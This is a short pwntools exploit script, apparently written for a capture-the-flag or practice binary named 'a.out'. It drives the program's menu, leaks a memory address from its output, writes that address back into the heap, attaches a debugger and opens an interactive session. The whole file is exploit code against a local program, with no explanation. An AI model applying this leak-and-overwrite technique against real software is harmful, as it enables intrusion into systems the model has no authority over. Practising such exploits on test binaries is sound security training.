#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64, u64

def main():
    p = process('./a.out')
    binary = ELF('./a.out')


    eof = b'\4'

    p.sendline('2')
    p.sendlineafter(':', 'aaaaaaaa')
    p.sendline('7')
    p.sendline('1')
    p.sendline('5')

    p.recvuntil('name is ')
    leak = u64(p.recvline(False).ljust(8, b'\x00'))

    p.sendline('4')
    p.sendlineafter(':', p64(leak)*2)
    p.sendline('5')
    
    attach(p)
    p.sendline('3')


    

    log.info(hex(leak))



    p.interactive();


if __name__ == '__main__':
    main()